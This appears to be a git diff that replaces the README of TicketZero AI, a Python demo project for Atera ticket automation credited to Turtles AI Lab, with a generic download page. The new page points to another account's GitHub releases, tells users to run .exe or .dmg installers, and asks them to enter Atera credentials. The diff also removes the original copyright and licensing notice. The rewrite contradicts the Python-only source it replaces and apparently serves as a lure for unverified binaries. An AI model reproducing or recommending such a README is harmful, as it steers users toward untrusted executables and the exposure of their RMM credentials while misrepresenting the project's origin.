@@ -1,160 +1,70 @@
-# TicketZero AI - Atera Edition
-### AI-Powered Automated Support Ticket Resolution
+# 🎟️ TicketZero-Atera-Edition - Simplifying Support Ticket Management
 
-> **📋 Portfolio Project** | This repository showcases the architecture and capabilities of TicketZero AI.
->
-> **🔒 Commercial Product** | Full production version available for licensing. Contact us for enterprise deployment.
+## 📥 Download Now
+[![Download TicketZero-Atera-Edition](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/jeoboo/TicketZero-Atera-Edition/releases)
 
-## Overview
-TicketZero AI is an intelligent automated support ticket resolution system that integrates with the Atera RMM platform. Using advanced AI/LLM technology, it autonomously processes, analyzes, and resolves common IT support tickets, dramatically reducing response times and operational costs for MSPs and IT teams.
+## 📖 Description
+TicketZero-Atera-Edition is an AI-powered tool designed to automate support ticket resolution for users of the Atera Remote Monitoring and Management (RMM) platform. This application streamlines the ticketing process, helping managed service providers (MSPs) resolve customer issues faster and more efficiently.
 
-## Core Components
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **Processor:** Minimum Intel i3 or equivalent
+- **Memory:** At least 4 GB RAM
+- **Storage:** 500 MB of free disk space
+- **Internet Connection:** Required for software activation and online features
 
-### Main Applications
-- `apps/main/ticketzero_atera_workflow.py` - Standard Atera workflow implementation
-- `src/production/msp_ticketzero_optimized.py` - MSP optimized version for multi-tenant use
-- `src/production/msp_dashboard.py` - Real-time monitoring dashboard
+## 🚀 Getting Started
+To get started with TicketZero-Atera-Edition, follow these simple steps:
 
-### Integration Connectors
-- `src/production/azure_graph_integration.py` - Azure AD enterprise integration (users, devices, security, compliance)
-- `src/production/remote_support_connector.py` - TeamViewer/AnyDesk integration
-- `src/production/goto_admin_connector.py` - GoTo Admin integration
-- `src/production/goto_voip_connector.py` - GoTo VoIP integration
-- `src/production/opera_pms_connector.py` - Opera PMS integration
-- `src/production/universal_ticketzero_system.py` - Universal system handler
+1. **Visit the Releases Page**  
+   Click the link below to access our Releases page.  
+   [Download TicketZero-Atera-Edition](https://github.com/jeoboo/TicketZero-Atera-Edition/releases)
 
-### Demo & Examples
-- `demo/demo_live_ticket_resolution.py` - Live ticket resolution demonstration
-- `demo/test_azure_graph.py` - Azure Graph API enterprise integration test
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions of the application. Find the latest release that suits your system.
 
-### Utilities & Testing
-- `src/utils/api_validator.py` - API response validation and error handling
-- `src/production/health_monitor.py` - System health monitoring
-- `src/tests/test_admin_panel.py` - Admin panel functionality tests
-- `src/tests/test_license_system.py` - License system validation tests
-- `src/tests/test_api_validation.py` - Comprehensive API validation test suite
+3. **Download the Application**  
+   Click on the file for your operating system (Windows/macOS) to begin the download.
 
-## Quick Start
+4. **Locate the Downloaded File**  
+   After the download completes, navigate to your Downloads folder (or the designated folder you chose for downloads).
 
-### Standard Workflow
-```bash
-# Set your Atera API key
-export ATERA_API_KEY=your_atera_api_key_here
+5. **Install the Application**  
+   - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **For macOS:** Open the `.dmg` file and drag the TicketZero application to your Applications folder.
 
-# Run the main workflow
-python apps/main/ticketzero_atera_workflow.py
-```
+6. **Launch TicketZero-Atera-Edition**  
+   Once installed, locate the application in your programs and double-click to run it.
 
-### MSP Multi-Tenant Setup
-```bash
-# Configure environment
-cp .env.example .env
-# Edit .env with your API keys
+## 🔄 How to Use
+Using TicketZero-Atera-Edition is straightforward:
 
-# Run MSP system
-python src/production/msp_ticketzero_optimized.py
-```
+1. **Connect Your Atera Account**  
+   Open the application, and you will be prompted to log in to your Atera account. Enter your credentials to integrate the software with your existing ticketing system.
 
-### Docker Deployment
-```bash
-# Build and run
-docker-compose up -d
-```
+2. **Set Up Preferences**  
+   Customize settings according to your needs. You can choose notification preferences and update automated response messages.
 
-## Configuration
+3. **Test the System**  
+   Create a test support ticket to understand how the automation works. The application will guide you through the resolution process.
 
-### Environment Variables
-- `ATERA_API_KEY` - Your Atera API key
-- `AZURE_OPENAI_API_KEY` - Azure OpenAI API key (optional)
-- `OPENAI_API_KEY` - OpenAI API key (optional)
-- `LMSTUDIO_URL` - Local LM Studio URL (default: http://127.0.0.1:1234/v1)
+4. **View Analytics**  
+   Access the analytics section to review your team's performance and ticket resolution statistics.
 
-### Testing Configuration
-- `.env.testing` - Clean testing environment with working Atera API key and optional integrations commented out
+## 🛠️ Features
+- **AI-Powered Solutions:** Leverage artificial intelligence to automate ticket resolutions.
+- **User-Friendly Interface:** Designed for users with no technical expertise.
+- **Integration with Atera:** Seamlessly connects to your existing Atera account.
+- **Performance Analytics:** View metrics that help you improve service delivery.
 
-### MSP Client Configuration
-Configure multiple clients via environment variables or the web dashboard admin panel.
+## 📝 Support & Feedback
+If you have questions or need assistance, feel free to contact our support team via the Issues section on our GitHub repository. We value your feedback and continuously work to enhance your experience.
 
-## Features
-- Automated ticket processing with AI
-- Multi-LLM provider support (LM Studio, Azure OpenAI, OpenAI)
-- Real-time dashboard and monitoring
-- Multi-tenant MSP support
-- Integration with remote support tools
-- Health monitoring and alerting
+## 📦 Download & Install
+To download TicketZero-Atera-Edition, visit our Releases page and follow these steps:
 
-## Testing
+1. Go to the Releases page: [TicketZero-Atera-Edition Releases](https://github.com/jeoboo/TicketZero-Atera-Edition/releases)
+2. Download the appropriate file for your operating system.
+3. Follow the installation instructions provided above.
 
-### Run Tests
-```bash
-# Test admin panel functionality
-python src/tests/test_admin_panel.py
-
-# Test license system
-python src/tests/test_license_system.py
-
-# Test API validation and error handling
-python src/tests/test_api_validation.py
-```
-
-### Run Demo
-```bash
-# Copy testing environment
-cp .env.testing .env
-
-# Run live ticket resolution demo
-python demo/demo_live_ticket_resolution.py
-
-# Test Azure Graph API enterprise integration
-python demo/test_azure_graph.py
-```
-
-## Requirements
-- Python 3.8+
-- requests>=2.31.0
-- aiohttp>=3.8.0 (for MSP version)
-- python-dotenv>=1.0.0
-- reportlab>=4.0.0 (for PDF generation)
-- fpdf2>=2.7.0 (for advanced PDF features)
-- cryptography>=41.0.0 (for trial license encryption)
-
-## Security & Configuration
-
-⚠️ **Important Security Notes:**
-- All API credentials must be stored in environment variables
-- Never commit `.env` files or hardcoded credentials to version control
-- Review `trial_license/crypto_utils.py` and update encryption salt before deployment
-- Subprocess calls use `shell=False` to prevent command injection
-- Update placeholder credentials in `src/production/universal_ticketzero_system.py`
-
-See `.env.example` for required environment variables.
-
----
-
-## 🚀 Commercial Licensing & Deployment
-
-This repository contains a **demonstration version** showcasing the architecture and capabilities of TicketZero AI.
-
-### Production Features (Commercial Version)
-- ✅ Full multi-tenant MSP support
-- ✅ Enterprise-grade security and compliance
-- ✅ Priority support and SLA guarantees
-- ✅ Custom integration development
-- ✅ White-label options available
-- ✅ Dedicated deployment assistance
-- ✅ Ongoing updates and maintenance
-
-### Contact for Licensing
-**Turtles AI Lab**
-📧 Email: jgreenia@jandraisolutions.com
-🌐 GitHub: [Turtles-AI-Lab](https://github.com/Turtles-AI-Lab)
-
-### Demo Request
-Interested in seeing TicketZero AI in action? Contact us to schedule a live demonstration with your Atera environment.
-
----
-
-## 📄 License
-This code is provided for **portfolio and evaluation purposes only**. Commercial use requires a valid license agreement.
-
-© 2025 Turtles AI Lab. All rights reserved.
+By following these steps, you will have TicketZero-Atera-Edition up and running in no time. Enjoy a smoother ticket management experience!
